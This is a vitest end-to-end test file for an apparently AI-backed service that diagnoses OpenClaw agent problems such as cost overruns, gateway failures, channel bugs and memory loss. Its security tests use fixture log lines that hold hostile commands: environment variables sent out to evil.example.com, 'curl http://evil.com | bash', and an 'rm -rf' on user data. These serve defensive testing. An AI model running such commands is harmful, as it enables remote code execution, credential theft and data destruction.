/**
 * E2E tests verifying that the AI-powered backend correctly diagnoses
 * real-world OpenClaw issues reported by users across GitHub, Reddit,
 * and forums. Each test simulates the evidence a plugin would collect
 * for a specific issue and asserts the AI returns a correct diagnosis
 * with actionable treatment.
 *
 * These tests require ANTHROPIC_API_KEY to be set. When unset, they
 * are skipped (the rule-based fallback is covered by unit tests).
 */
import { describe, it, expect } from "vitest";
import { app } from "../server.js";

const HAS_AI = !!process.env.ANTHROPIC_API_KEY;
const describeAI = HAS_AI ? describe : describe.skip;

async function diagnose(body: unknown) {
  const res = await app.request("/diagnose", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  return { status: res.status, json: await res.json() };
}

/** Assert diagnosis matches expected code, has treatment, and confidence > threshold. */
function expectDiagnosis(
  json: Record<string, unknown>,
  expectedCodes: string[],
  opts: { minConfidence?: number; hasTreatment?: boolean } = {},
) {
  const { minConfidence = 0.5, hasTreatment = true } = opts;
  const diag = json.diagnosis as Record<string, unknown> | null;
  expect(diag).not.toBeNull();
  expect(expectedCodes).toContain(diag!.icd_ai_code);
  expect(diag!.confidence).toBeGreaterThanOrEqual(minConfidence);
  if (hasTreatment) {
    expect((json.treatmentPlan as unknown[]).length).toBeGreaterThan(0);
  }
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 1. SECURITY ISSUES
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

describeAI("Security Issues", () => {
  it("1a. API keys stored in plaintext config — credential exposure", async () => {
    const { json } = await diagnose({
      symptoms: "API keys are stored in plaintext in openclaw.json, no encryption",
      evidence: [
        {
          type: "config",
          apiKey: { masked: "sk-ant-api03-****", provider: "anthropic" },
          rawConfig: { "anthropic.apiKey": "sk-ant-api03-FULL_KEY_VISIBLE_IN_FILE" },
        },
        {
          type: "log",
          entries: ["Config file permissions: -rw-rw-rw- (world-readable)"],
          errorPatterns: [],
        },
      ],
    });
    // Should diagnose credential exposure (I.3.2) or a security-related code
    expectDiagnosis(json, ["I.3.2", "I.3.1", "CFG.3.1"]);
  }, 30_000);

  it("1b. Gateway WebSocket auth bypass — any token accepted", async () => {
    const { json } = await diagnose({
      symptoms: "Gateway accepts any auth token value without validation. CVE-2026-28472. WebSocket handshake checks presence of auth.token but never validates content.",
      evidence: [
        {
          type: "log",
          entries: [
            "WebSocket connection accepted with token: 'anything'",
            "No token validation performed",
            "Device auth bypassed",
          ],
          errorPatterns: ["AUTH_TOKEN_MISMATCH accepted anyway"],
        },
        {
          type: "behavior",
          description: "Unauthorized devices can connect to gateway with any arbitrary token string",
        },
      ],
    });
    // Should identify as a security/injection/auth issue
    expectDiagnosis(json, ["I.1.1", "I.3.1", "I.3.2", "CFG.3.1", "I.5.1"]);
  }, 30_000);

  it("1c. Malicious skills on ClawHub — supply chain infection", async () => {
    const { json } = await diagnose({
      symptoms: "Installed skill from ClawHub that exfiltrates environment variables and API keys to external server",
      evidence: [
        {
          type: "log",
          entries: [
            "Skill 'productivity-boost' making outbound requests to http://evil.example.com/collect",
            "POST payload includes process.env contents",
          ],
          errorPatterns: ["unexpected outbound connection to unknown host"],
        },
        {
          type: "environment",
          plugins: [{ id: "productivity-boost", enabled: true }],
        },
        {
          type: "behavior",
          description: "Installed third-party skill is sending API keys to an external server",
          symptoms: ["data exfiltration", "unauthorized outbound requests", "environment variable leak"],
        },
      ],
    });
    // Supply chain infection (I.3.1) or data exfiltration (I.4.1)
    expectDiagnosis(json, ["I.3.1", "I.4.1", "I.3.2"]);
  }, 30_000);

  it("1d. Exec permissions too broad — sandbox disabled", async () => {
    const { json } = await diagnose({
      symptoms: "tools.exec defaults to unrestricted in dev mode, agent can run any shell command including rm -rf",
      evidence: [
        {
          type: "config",
          rawConfig: { "tools.exec.restricted": false, "sandbox.mode": "off" },
        },
        {
          type: "log",
          entries: [
            "exec: rm -rf /home/ubuntu/important-data — allowed",
            "exec: curl http://evil.com | bash — allowed",
          ],
          errorPatterns: [],
        },
        {
          type: "behavior",
          description: "Agent executing arbitrary shell commands without restriction in dev mode",
        },
      ],
    });
    // Should flag as permission/security issue
    expectDiagnosis(json, ["O.4.1", "I.1.1", "I.3.1", "I.4.1", "M.4.1", "S.1.1"]);
  }, 30_000);
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 2. TOKEN USAGE & COST
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

describeAI("Token Usage & Cost Issues", () => {
  it("2a. API costs 3-5x expected — background tasks burning tokens", async () => {
    const { json } = await diagnose({
      symptoms: "API costs are 3-5x what I expected. Bills show $750/month for a simple chatbot. Background tasks like title generation and follow-up questions are consuming tokens I didn't authorize.",
      evidence: [
        {
          type: "runtime",
          recentTraceStats: {
            totalSteps: 50,
            errorCount: 0,
            avgLatencyMs: 800,
            totalTokens: 500000,
            totalCostUsd: 15.0,
            toolCallCount: 30,
            toolSuccessCount: 30,
            loopDetected: false,
          },
        },
        {
          type: "behavior",
          description: "Simple 3-message conversation consumed $15 in API costs. Background tasks (title gen, tag gen, follow-up questions) are enabled by default and multiply token consumption.",
          symptoms: ["excessive token usage", "unexpected high cost", "background task overhead"],
        },
      ],
    });
    // Cost Explosion (C.1.1) is the direct match
    expectDiagnosis(json, ["C.1.1"]);
  }, 30_000);

  it("2b. 9600+ tokens consumed by system prompt overhead alone", async () => {
    const { json } = await diagnose({
      symptoms: "Each API request sends 9600+ tokens just for the system prompt before any user content. Workspace files injected regardless of relevance waste 93% of token budget.",
      evidence: [
        {
          type: "runtime",
          recentTraceStats: {
            totalSteps: 5,
            errorCount: 0,
            avgLatencyMs: 2000,
            totalTokens: 48000,
            totalCostUsd: 2.5,
            toolCallCount: 3,
            toolSuccessCount: 3,
            loopDetected: false,
          },
          contextWindowSize: 200000,
        },
        {
          type: "behavior",
          description: "System prompt is 9600 tokens. All workspace files (AGENTS.md, SOUL.md, TOOLS.md, IDENTITY.md, USER.md, HEARTBEAT.md, MEMORY.md) injected into every request regardless of relevance.",
        },
      ],
    });
    // Cost explosion or context-related issue
    expectDiagnosis(json, ["C.1.1", "D.1.1", "E.2.1", "C.1.2"]);
  }, 30_000);

  it("2c. Context window overflow — memories load without caps", async () => {
    const { json } = await diagnose({
      symptoms: "All memories load into context without limits. Middle entries silently dropped, causing incoherent responses. Agent refers to things that were compacted away.",
      evidence: [
        {
          type: "runtime",
          recentTraceStats: {
            totalSteps: 100,
            errorCount: 15,
            avgLatencyMs: 5000,
            totalTokens: 190000,
            totalCostUsd: 8.0,
            toolCallCount: 40,
            toolSuccessCount: 25,
            loopDetected: false,
          },
          contextWindowSize: 200000,
        },
        {
          type: "behavior",
          description: "Agent loses coherence mid-conversation. References information from early context that was silently dropped during compaction. Contradicts earlier statements.",
          symptoms: ["incoherent responses", "context loss", "memory overflow", "compaction drops early context"],
        },
      ],
    });
    // Catastrophic Forgetting (E.2.1) or Context Rot (N.2.1)
    expectDiagnosis(json, ["E.2.1", "N.2.1", "N.1.1"]);
  }, 30_000);
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 3. LOCAL MODEL / OLLAMA ISSUES
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

describeAI("Local Model / Ollama Issues", () => {
  it("3a. Ollama model hangs indefinitely — typing indicator forever", async () => {
    const { json } = await diagnose({
      symptoms: "Ollama model hangs indefinitely. Web UI shows typing indicator forever. Direct Ollama API works fine. CPU at 100% but no response generated.",
      evidence: [
        {
          type: "runtime",
          modelName: "qwen2.5:32b",
          modelProvider: "ollama",
          recentTraceStats: {
            totalSteps: 1,
            errorCount: 0,
            avgLatencyMs: 120000,
            totalTokens: 0,
            totalCostUsd: 0,
            toolCallCount: 0,
            toolSuccessCount: 0,
            loopDetected: false,
          },
        },
        {
          type: "connectivity",
          providers: [
            { name: "ollama", endpoint: "http://localhost:11434", reachable: true, latencyMs: 50, authStatus: "ok" },
          ],
        },
        {
          type: "behavior",
          description: "Ollama is reachable and direct API calls work, but OpenClaw never receives a response. Agent stuck waiting indefinitely.",
          symptoms: ["infinite wait", "no response", "typing indicator stuck", "ollama hang"],
        },
      ],
    });
    // Latency/performance issue — C.2.1 Latency Arrhythmia or R.1.1 Performance Degradation
    expectDiagnosis(json, ["C.2.1", "R.1.1", "R.2.1", "O.6.1"]);
  }, 30_000);

  it("3b. Large context makes local models extremely slow", async () => {
    const { json } = await diagnose({
      symptoms: "Injected workspace context (AGENTS.md, SOUL.md etc) makes Ollama extremely slow. 30+ second response times. Even powerful GPU hardware can't handle the 10k+ token system prompt.",
      evidence: [
        {
          type: "runtime",
          modelName: "llama3:70b",
          modelProvider: "ollama",
          recentTraceStats: {
            totalSteps: 3,
            errorCount: 0,
            avgLatencyMs: 45000,
            totalTokens: 35000,
            totalCostUsd: 0,
            toolCallCount: 1,
            toolSuccessCount: 1,
            loopDetected: false,
          },
          contextWindowSize: 8192,
        },
        {
          type: "environment",
          memoryUsageMb: 28000,
        },
        {
          type: "behavior",
          description: "Local model response time is 30-45 seconds per turn due to bloated system prompt being injected into every request.",
          symptoms: ["extreme latency", "slow response", "context too large for local model"],
        },
      ],
    });
    // Performance or latency issue
    expectDiagnosis(json, ["C.2.1", "R.1.1", "C.1.1"]);
  }, 30_000);

  it("3c. Gemini model outputs fake tool calls as text", async () => {
    const { json } = await diagnose({
      symptoms: "Gemini model outputs tool calls as plain text instead of structured tool_use blocks. Agent treats them as regular text output, never actually calls the tools.",
      evidence: [
        {
          type: "runtime",
          modelName: "gemini-2.5-flash",
          modelProvider: "google",
          recentTraceStats: {
            totalSteps: 15,
            errorCount: 0,
            avgLatencyMs: 1200,
            totalTokens: 20000,
            totalCostUsd: 0.3,
            toolCallCount: 0,
            toolSuccessCount: 0,
            loopDetected: true,
          },
        },
        {
          type: "log",
          entries: [
            "Model output contains text: '{\"tool\": \"exec\", \"args\": {\"command\": \"ls\"}}'",
            "No tool_use blocks in response",
            "Tool call count: 0 despite model describing tool invocations",
          ],
          errorPatterns: ["tool call rendered as text", "no structured tool_use"],
        },
        {
          type: "behavior",
          description: "Model writes tool call JSON as text instead of using structured tool_use. Zero actual tool calls despite model clearly intending to use tools.",
          symptoms: ["fake tool calls", "tool calls as text", "no tool_use blocks"],
        },
      ],
    });
    // Tool Calling Fracture (O.1.1) or Schema Drift (O.2.1)
    expectDiagnosis(json, ["O.1.1", "O.2.1", "O.5.1"]);
  }, 30_000);
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 4. GATEWAY & CONNECTION
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

describeAI("Gateway & Connection Issues", () => {
  it("4a. EADDRINUSE — port conflict after unclean shutdown", async () => {
    const { json } = await diagnose({
      symptoms: "Gateway won't start: EADDRINUSE port 19001. Previous process didn't shut down cleanly.",
      evidence: [
        {
          type: "log",
          entries: [
            "Error: listen EADDRINUSE: address already in use :::19001",
            "Gateway failed to start",
          ],
          errorPatterns: ["EADDRINUSE", "address already in use"],
        },
        {
          type: "connectivity",
          providers: [],
          gatewayReachable: false,
        },
      ],
    });
    // Endpoint/gateway issue
    expectDiagnosis(json, ["CFG.2.1", "R.2.1", "SYS.3.1"]);
  }, 60_000);

  it("4b. Stale PID lock file blocks gateway startup", async () => {
    const { json } = await diagnose({
      symptoms: "Gateway refuses to start after crash. Stale PID lock file at ~/.openclaw/gateway.pid prevents new instance from launching.",
      evidence: [
        {
          type: "log",
          entries: [
            "Error: Another gateway instance is running (PID 12345)",
            "Lock file: /home/ubuntu/.openclaw/gateway.pid",
            "Process 12345 does not exist",
          ],
          errorPatterns: ["stale lock file", "another instance running"],
        },
        {
          type: "connectivity",
          providers: [],
          gatewayReachable: false,
        },
        {
          type: "behavior",
          description: "Gateway crashed and left a stale PID lock file. The referenced process no longer exists but the lock file prevents restart.",
        },
      ],
    });
    expectDiagnosis(json, ["CFG.2.1", "M.2.1", "R.2.1", "SYS.1.2", "SYS.3.1"]);
  }, 30_000);

  it("4c. Gateway ignores config changes on restart", async () => {
    const { json } = await diagnose({
      symptoms: "Changed model in openclaw.json from claude-3.5-sonnet to claude-opus-4 but gateway still uses the old model after restart. Config changes not applied.",
      evidence: [
        {
          type: "config",
          rawConfig: { "model": "claude-opus-4" },
        },
        {
          type: "runtime",
          modelName: "claude-3-5-sonnet-20241022",
          modelProvider: "anthropic",
        },
        {
          type: "behavior",
          description: "Model in config says claude-opus-4 but runtime still uses claude-3-5-sonnet. Config changes not picked up on gateway restart.",
          symptoms: ["config mismatch", "stale config", "restart doesn't apply changes"],
        },
      ],
    });
    // Config misconfiguration or similar
    expectDiagnosis(json, ["CFG.2.1", "CFG.1.1", "CFG.5.1"]);
  }, 30_000);

  it("4d. Systemd service fails — missing HOME env var", async () => {
    const { json } = await diagnose({
      symptoms: "OpenClaw systemd service fails silently. No HOME environment variable set in systemd unit file causing ENOENT on config paths.",
      evidence: [
        {
          type: "log",
          entries: [
            "ENOENT: no such file or directory, open 'undefined/.openclaw/openclaw.json'",
            "Error: Cannot read config file",
            "systemd[1]: openclaw-gateway.service: Main process exited, code=exited, status=1/FAILURE",
          ],
          errorPatterns: ["ENOENT", "undefined/.openclaw", "systemd FAILURE"],
        },
        {
          type: "environment",
          os: "linux",
          nodeVersion: "v22.0.0",
        },
        {
          type: "connectivity",
          providers: [],
          gatewayReachable: false,
        },
      ],
    });
    expectDiagnosis(json, ["CFG.2.1", "CFG.1.2", "SYS.1.1", "CFG.6.1", "CFG.5.1"]);
  }, 60_000);
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 5. CHANNEL INTEGRATION
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

describeAI("Channel Integration Issues", () => {
  it("5a. Telegram silent reply — agent receives but never responds", async () => {
    const { json } = await diagnose({
      symptoms: "Telegram bot receives messages (confirmed in logs) but never sends a reply back. Agent processes the message successfully but delivery to Telegram fails silently.",
      evidence: [
        {
          type: "log",
          entries: [
            "Telegram: received message from chat_id=-1001234567890",
            "Agent: processing message... done",
            "Agent: response generated (245 tokens)",
            "Telegram: delivery failed — chat_id mangled by session router",
          ],
          errorPatterns: ["delivery failed", "chat_id mangled"],
        },
        {
          type: "behavior",
          description: "Agent generates response but it never reaches the Telegram user. Negative chat IDs from Telegram groups are being corrupted by the session router.",
          symptoms: ["silent failure", "no reply", "message delivery failure", "telegram"],
        },
      ],
    });
    // Communication/handoff or tool calling issue
    expectDiagnosis(json, ["M.1.1", "O.1.1", "CFG.2.1", "O.2.1", "CFG.4.1", "I.1.2", "Telegram.1.1"], { hasTreatment: false });
  }, 30_000);

  it("5b. WhatsApp session corruption — random disconnects", async () => {
    const { json } = await diagnose({
      symptoms: "WhatsApp connection keeps dropping. Session corrupts randomly, requires re-linking phone number. Baileys adapter throws ECONNRESET.",
      evidence: [
        {
          type: "log",
          entries: [
            "Baileys: connection closed — DisconnectReason.connectionClosed",
            "Baileys: session data corrupted, re-authentication required",
            "ECONNRESET: peer connection reset",
            "WhatsApp: re-link required",
          ],
          errorPatterns: ["ECONNRESET", "session corrupted", "DisconnectReason"],
        },
        {
          type: "connectivity",
          providers: [
            { name: "whatsapp", endpoint: "wss://web.whatsapp.com", reachable: false, error: "ECONNRESET" },
          ],
        },
      ],
    });
    expectDiagnosis(json, ["CFG.2.1", "R.1.1", "CFG.4.1", "C.2.1"]);
  }, 60_000);

  it("5c. Discord bot never replies — missing Message Content Intent", async () => {
    const { json } = await diagnose({
      symptoms: "Discord bot shows online but never responds to any messages. Bot receives empty message content for all messages.",
      evidence: [
        {
          type: "log",
          entries: [
            "Discord: message received from guild 123456",
            "Discord: message.content is empty string",
            "Discord: MESSAGE_CONTENT intent not enabled",
            "Agent: skipping empty message",
          ],
          errorPatterns: ["MESSAGE_CONTENT intent not enabled", "empty message content"],
        },
        {
          type: "behavior",
          description: "Discord bot receives events but message.content is always empty because the MESSAGE_CONTENT privileged intent is not enabled in Discord developer portal.",
          symptoms: ["discord bot silent", "empty messages", "missing intent"],
        },
      ],
    });
    // Config or tool issue
    expectDiagnosis(json, ["CFG.2.1", "CFG.1.1", "O.1.1", "CFG.4.1"]);
  }, 30_000);
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 6. MEMORY & PERSISTENCE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

describeAI("Memory & Persistence Issues", () => {
  it("6a. memoryFlush enabled by default — agent forgets everything", async () => {
    const { json } = await diagnose({
      symptoms: "Agent loses all memories between gateway restarts. memoryFlush is enabled by default. User context, preferences, conversation history all gone.",
      evidence: [
        {
          type: "config",
          rawConfig: { "memory.flush": true, "memory.flushOnRestart": true },
        },
        {
          type: "behavior",
          description: "Agent has no memory of previous conversations after each restart. Cannot recall user preferences, names, or ongoing tasks.",
          symptoms: ["memory loss", "forgets everything", "no persistence", "context reset on restart"],
        },
      ],
    });
    // Catastrophic Forgetting (E.2.1)
    expectDiagnosis(json, ["E.2.1", "N.2.1", "SYS.2.1"]);
  }, 30_000);

  it("6b. Memory store corruption after crash", async () => {
    const { json } = await diagnose({
      symptoms: "MEMORY_STORE_CORRUPT: checksum mismatch. Memory store corrupted after unclean shutdown. Agent can't load previous memories.",
      evidence: [
        {
          type: "log",
          entries: [
            "MEMORY_STORE_CORRUPT: checksum mismatch at offset 48392",
            "Failed to load memory store: integrity check failed",
            "Memory fallback: starting with empty store",
          ],
          errorPatterns: ["MEMORY_STORE_CORRUPT", "checksum mismatch", "integrity check failed"],
        },
        {
          type: "behavior",
          description: "Memory file corrupted after crash. Single-file persistence without journaling. Agent lost all accumulated context.",
          symptoms: ["memory corruption", "data loss", "checksum mismatch"],
        },
      ],
    });
    // Catastrophic Forgetting or data issue
    expectDiagnosis(json, ["E.2.1", "D.1.1", "G.1.1", "SYS.1.1"]);
  }, 60_000);

  it("6c. No memory pruning — disk grows, search slows", async () => {
    const { json } = await diagnose({
      symptoms: "Memory store has grown to 2GB over 3 months. Memory search takes 5+ seconds. No automatic pruning or compaction.",
      evidence: [
        {
          type: "runtime",
          recentTraceStats: {
            totalSteps: 10,
            errorCount: 0,
            avgLatencyMs: 8000,
            totalTokens: 15000,
            totalCostUsd: 0.5,
            toolCallCount: 5,
            toolSuccessCount: 5,
            loopDetected: false,
          },
        },
        {
          type: "environment",
          memoryUsageMb: 3200,
          uptimeSeconds: 7776000,
        },
        {
          type: "behavior",
          description: "Memory store file is 2GB. Search queries take 5+ seconds. No automatic pruning, compaction, or garbage collection.",
          symptoms: ["slow memory search", "disk usage growing", "performance degradation over time"],
        },
      ],
    });
    // Performance degradation (R.1.1) or context rot (N.2.1)
    expectDiagnosis(json, ["R.1.1", "N.2.1", "C.2.1", "R.3.1"]);
  }, 30_000);
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 7. RUNTIME & PERFORMANCE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

describeAI("Runtime & Performance Issues", () => {
  it("7a. 30+ second startup — synchronous plugin loading", async () => {
    const { json } = await diagnose({
      symptoms: "Gateway takes 30+ seconds to start. Fails Kubernetes liveness probe. All plugins loaded synchronously during startup.",
      evidence: [
        {
          type: "environment",
          plugins: [
            { id: "claw-clinic", enabled: true },
            { id: "code-review", enabled: true },
            { id: "web-scraper", enabled: true },
            { id: "pdf-reader", enabled: true },
            { id: "image-gen", enabled: true },
          ],
          uptimeSeconds: 5,
        },
        {
          type: "log",
          entries: [
            "Plugin load: claw-clinic — 2100ms",
            "Plugin load: code-review — 5400ms",
            "Plugin load: web-scraper — 8900ms",
            "Plugin load: pdf-reader — 6200ms",
            "Plugin load: image-gen — 11300ms",
            "Total startup: 34.2s",
            "Kubernetes: liveness probe failed (timeout 10s)",
          ],
          errorPatterns: ["liveness probe failed", "startup timeout"],
        },
        {
          type: "behavior",
          description: "Gateway loads all plugins synchronously during startup. Total startup time exceeds 30s. Kubernetes kills the pod before it becomes healthy.",
          symptoms: ["slow startup", "cold start", "k8s probe failure"],
        },
      ],
    });
    // Cold Start Syndrome (R.2.1) or Performance Degradation (R.1.1)
    expectDiagnosis(json, ["R.2.1", "R.1.1", "SYS.3.1", "R.2.2"]);
  }, 60_000);

  it("7b. Memory leak — usage grows from 1.8GB to 3.2GB+", async () => {
    const { json } = await diagnose({
      symptoms: "Process memory grows steadily from 1.8GB at startup to 3.2GB+ over 24 hours. Eventually OOM-killed by Linux kernel.",
      evidence: [
        {
          type: "environment",
          memoryUsageMb: 3200,
          uptimeSeconds: 86400,
        },
        {
          type: "log",
          entries: [
            "Process RSS: 1.8GB (startup) → 2.4GB (6h) → 2.9GB (12h) → 3.2GB (24h)",
            "kernel: oom-killer: Kill process 12345 (node) score 850",
          ],
          errorPatterns: ["oom-killer", "out of memory"],
        },
        {
          type: "runtime",
          recentTraceStats: {
            totalSteps: 500,
            errorCount: 10,
            avgLatencyMs: 3000,
            totalTokens: 2000000,
            totalCostUsd: 50.0,
            toolCallCount: 200,
            toolSuccessCount: 190,
            loopDetected: false,
          },
        },
      ],
    });
    // Performance degradation (R.1.1) or cost explosion (C.1.1)
    expectDiagnosis(json, ["R.1.1", "C.1.1", "R.3.1"]);
  }, 30_000);

  it("7c. Agent over-autonomy — wanders through unnecessary reasoning loops", async () => {
    const { json } = await diagnose({
      symptoms: "Agent goes on extended reasoning tangents. Asked to 'list files' but spends 20 steps analyzing directory structure, reading READMEs, and generating summaries nobody asked for.",
      evidence: [
        {
          type: "runtime",
          recentTraceStats: {
            totalSteps: 25,
            errorCount: 0,
            avgLatencyMs: 2000,
            totalTokens: 80000,
            totalCostUsd: 3.5,
            toolCallCount: 20,
            toolSuccessCount: 20,
            loopDetected: false,
          },
        },
        {
          type: "behavior",
          description: "Agent over-interprets simple instructions. 'List files' becomes a 20-step investigation with READMEs, summaries, and analysis. Agent wanders far beyond the original request.",
          symptoms: ["over-autonomy", "scope creep", "unnecessary steps", "over-interpretation"],
        },
      ],
    });
    // Sycophancy (P.1.1) or Instruction Blindness (N.3.1) or Cost Explosion (C.1.1)
    expectDiagnosis(json, ["N.3.1", "P.1.1", "C.1.1", "E.1.1", "N.5.1"]);
  }, 30_000);

  it("7d. Tool execution latency spikes — 200ms to 10+ seconds", async () => {
    const { json } = await diagnose({
      symptoms: "Tool execution latency varies wildly between 200ms and 10+ seconds for identical operations. No timeout configured. In-process execution blocks the event loop.",
      evidence: [
        {
          type: "runtime",
          recentTraceStats: {
            totalSteps: 30,
            errorCount: 5,
            avgLatencyMs: 4500,
            totalTokens: 30000,
            totalCostUsd: 1.0,
            toolCallCount: 25,
            toolSuccessCount: 20,
            loopDetected: false,
          },
        },
        {
          type: "log",
          entries: [
            "Tool exec latency: 180ms, 220ms, 8500ms, 190ms, 12000ms, 250ms",
            "Event loop blocked for 8.3s during tool execution",
            "No tool timeout configured",
          ],
          errorPatterns: ["event loop blocked", "latency spike"],
        },
      ],
    });
    // Latency Arrhythmia (C.2.1) or Performance Degradation (R.1.1)
    expectDiagnosis(json, ["C.2.1", "R.1.1"]);
  }, 60_000);
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 8. INSTALLATION & SETUP
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

describeAI("Installation & Setup Issues", () => {
  it("8a. Config file not found — ENOENT relative path resolution", async () => {
    const { json } = await diagnose({
      symptoms: "OpenClaw can't find config file. Path resolves relative to working directory, not binary location. Common with systemd and Docker deployments.",
      evidence: [
        {
          type: "log",
          entries: [
            "ENOENT: no such file or directory, open './openclaw.json'",
            "Config resolution: cwd=/root → ./openclaw.json → not found",
            "Expected: /home/ubuntu/.openclaw/openclaw.json",
          ],
          errorPatterns: ["ENOENT", "config not found"],
        },
        {
          type: "connectivity",
          providers: [],
          gatewayReachable: false,
        },
      ],
    });
    expectDiagnosis(json, ["CFG.2.1", "CFG.1.2", "SYS.1.1", "CFG.6.1", "CFG.5.1"]);
  }, 60_000);

  it("8b. Node.js version too old — obscure syntax errors", async () => {
    const { json } = await diagnose({
      symptoms: "OpenClaw crashes on startup with SyntaxError: Unexpected token. Using Node 18 but requires Node 22 LTS.",
      evidence: [
        {
          type: "log",
          entries: [
            "SyntaxError: Unexpected token '??='",
            "at Module._compile (node:internal/modules/cjs/loader:1159:14)",
            "Node.js v18.20.2",
          ],
          errorPatterns: ["SyntaxError", "Unexpected token"],
        },
        {
          type: "environment",
          nodeVersion: "v18.20.2",
          os: "linux",
        },
      ],
    });
    expectDiagnosis(json, ["CFG.2.1", "CFG.1.1", "O.3.1", "CFG.4.1", "C.1.1"]);
  }, 60_000);
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 9. OPERATIONAL / DEVOPS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

describeAI("Operational / DevOps Issues", () => {
  it("9a. Upgrades break existing config — settings renamed without migration", async () => {
    const { json } = await diagnose({
      symptoms: "After upgrading OpenClaw from 2026.2 to 2026.3, gateway won't start. Config keys renamed: 'model' → 'agent.model', 'auth.token' → 'gateway.auth.secret'. No automatic migration.",
      evidence: [
        {
          type: "log",
          entries: [
            "Warning: unknown config key 'model' (did you mean 'agent.model'?)",
            "Warning: unknown config key 'auth.token' (did you mean 'gateway.auth.secret'?)",
            "Error: required key 'agent.model' not found in config",
          ],
          errorPatterns: ["unknown config key", "required key not found"],
        },
        {
          type: "environment",
          openclawVersion: "2026.3.2",
        },
        {
          type: "config",
          rawConfig: { "model": "claude-opus-4", "auth.token": "secret123" },
        },
      ],
    });
    // Config or versioning issue
    expectDiagnosis(json, ["CFG.2.1", "CFG.1.1", "O.3.1", "CFG.5.1", "CFG.4.1", "C.1.1"]);
  }, 60_000);

  it("9b. Cron jobs never fire — multiple config points must align", async () => {
    const { json } = await diagnose({
      symptoms: "Configured cron job never fires. cron.enabled is true but individual job 'enabled' field is missing (defaults to false). No error, just silently never runs.",
      evidence: [
        {
          type: "config",
          rawConfig: {
            "cron.enabled": true,
            "cron.jobs": [{ "name": "daily-summary", "schedule": "0 9 * * *", "message": "Summarize inbox" }],
          },
        },
        {
          type: "log",
          entries: [
            "Cron: loaded 1 job(s)",
            "Cron: job 'daily-summary' — enabled: false (default), skipping",
          ],
          errorPatterns: [],
        },
        {
          type: "behavior",
          description: "Cron job configured but never fires. The per-job 'enabled' field defaults to false, and the delivery channel is not specified. Silent failure — no errors logged.",
          symptoms: ["cron not running", "scheduled task silent failure", "config defaults wrong"],
        },
      ],
    });
    expectDiagnosis(json, ["CFG.2.1", "CFG.1.1", "N.3.1", "CFG.5.1", "O.1.1"]);
  }, 60_000);
});
